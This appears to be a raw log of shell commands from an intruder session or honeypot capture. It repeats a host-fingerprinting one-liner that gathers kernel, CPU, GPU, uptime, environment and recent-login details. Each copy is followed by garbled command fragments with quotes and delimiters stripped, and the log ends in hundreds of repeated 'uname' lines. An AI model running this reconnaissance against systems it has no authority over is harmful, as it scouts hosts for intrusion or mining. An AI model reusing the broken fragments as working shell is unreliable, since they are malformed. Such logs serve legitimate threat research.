"ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
env | head -10
pwd
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
